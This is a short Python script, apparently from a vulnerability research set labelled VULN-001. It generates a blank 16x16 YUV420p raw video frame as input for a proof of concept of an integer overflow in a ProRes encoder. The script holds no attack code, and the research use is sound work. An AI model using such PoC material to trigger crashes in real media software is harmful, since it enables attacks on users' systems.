#!/usr/bin/env python3
"""
VULN-001: Generate minimal rawvideo YUV420p input for prores_aw integer overflow PoC.
Creates a 16x16 yuv420p frame (384 bytes total).
"""
import struct
import sys
import os

output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.yuv")

# 16x16 yuv420p frame
width = 16
height = 16

# Y plane: 16*16 = 256 bytes, all zeros (black luma)
y_plane = bytes(width * height)

# Cb plane (U): 8*8 = 64 bytes, all 128 (neutral chroma)
cb_plane = bytes([128] * ((width // 2) * (height // 2)))

# Cr plane (V): 8*8 = 64 bytes, all 128 (neutral chroma)
cr_plane = bytes([128] * ((width // 2) * (height // 2)))

frame = y_plane + cb_plane + cr_plane
assert len(frame) == 384, f"Expected 384 bytes, got {len(frame)}"

with open(output_file, "wb") as f:
    f.write(frame)

print(f"Written {len(frame)} bytes to {output_file}")
